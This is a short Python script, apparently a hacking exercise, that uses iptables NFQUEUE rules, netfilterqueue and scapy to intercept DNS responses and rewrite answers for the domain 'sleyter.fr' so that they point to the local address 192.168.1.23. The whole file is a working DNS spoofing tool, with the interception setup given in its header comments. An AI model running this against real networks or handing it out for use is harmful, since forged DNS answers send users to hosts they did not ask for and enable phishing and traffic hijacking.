# -*- coding: utf-8 -*-
# apt install libnetfilter-queue-dev
# pip install netfilterqueue
# iptables -I INPUT -j NFQUEUE --queue-num 50
# iptables -I OUTPUT -j NFQUEUE --queue-num 50

import netfilterqueue
from scapy.layers.dns import *
from scapy.layers.inet import *

def callback(packet):
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
       qname = scapy_packet[DNSQR].qname
       if b"sleyter.fr" in qname:
           print("Visite portfolio détectée")
           answer = DNSRR(rrname=qname, rdata="192.168.1.23")
           scapy_packet[DNS].an = answer
           scapy_packet[DNS].ancount = 1
           del scapy_packet[IP].len
           del scapy_packet[UDP].len
           del scapy_packet[IP].chksum
           del scapy_packet[UDP].chksum
           packet.set_payload(bytes(scapy_packet))
        # print(scapy_packet.show())
    packet.accept()    

try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(50, callback)
    queue.run()
except KeyboardInterrupt:
    queue.unbind()
    print("\n[-] STOP")
except Exception as e:
    print(str(e))    
